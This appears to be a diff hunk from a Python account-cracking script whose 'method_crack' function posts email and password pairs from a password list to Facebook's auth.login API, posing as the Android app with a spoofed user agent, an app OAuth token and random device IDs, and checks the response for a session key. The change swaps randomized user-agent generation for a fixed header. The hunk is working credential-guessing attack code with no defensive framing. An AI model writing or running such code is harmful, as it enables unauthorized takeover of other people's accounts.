@@ -104,24 +104,7 @@ def method_crack(ids,passlist):
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
             datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
-            dalvik_version = ["Dalvik/2.1.0"]
-            android_version = ["Android 10", "Android 11", "Android 12"]
-            device_make = ["Samsung", "Nokia", "Google Pixel", "OnePlus"]
-            app_version = ["FBAV/409.0.0.27.106", "FBAV/410.0.0.28.107", "FBAV/411.0.0.29.108"]
-            locale = ["en_US", "en_UK", "fr_FR", "es_ES"]
-            screen_resolution = ["1080x1920", "720x1280", "1440x2560"]
-            facebook_build = ["FB4A", "FB4B", "FB4C"]
-            processor_architecture = ["armeabi-v7a", "arm64-v8a", "x86"]
-            facebook_fw_version = ["FB_FW/1", "FB_FW/2"]
-            random_density = random.uniform(1.0, 3.0)  # Generate a random density value
-            random_width = random.randint(320, 1440)   # Generate a random width value
-            random_height = random.randint(480, 2560)  # Generate a random height value
-
-# Randomly select values for each part of the user agent
-             ##user_agen = f"{random.choice(dalvik_version)} (Linux; U; {random.choice(android_version)}; {random.choice(device_make)} Build/{random.randint(1, 999999)}.001) " \
-             ##f"[FBAN/{random.choice(facebook_build)};{random.choice(app_version)};FBPN/com.facebook.katana;FBLC/{random.choice(locale)};" \
-             ##f"FBBV/{random.randint(1, 999999)};FBCR/{random.choice(['AT&T', 'Verizon', 'T-Mobile'])};FBMF/{random.choice(device_make)};FBBD/{random.choice(device_make)};" \
-             ##f"FBDV/{random.choice(['Nokia0', 'Nokia1', 'Nokia2'])};FBSV/11;FBCA/{random.choice(processor_architecture)};FBDM/{{density={random_density:.2f},width={random_width},height={random_height}}};{random.choice(facebook_fw_version)};FBRV/{random.randint(1, 999999)}}]"
+            header={'User-Agent': '[FBAN/FB4A;FBAV/116.0.0.0;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
             url='https://api.facebook.com/method/auth.login'
             reqx=requests.post(url,data=datax,headers=header).json()
             if 'session_key' in reqx:
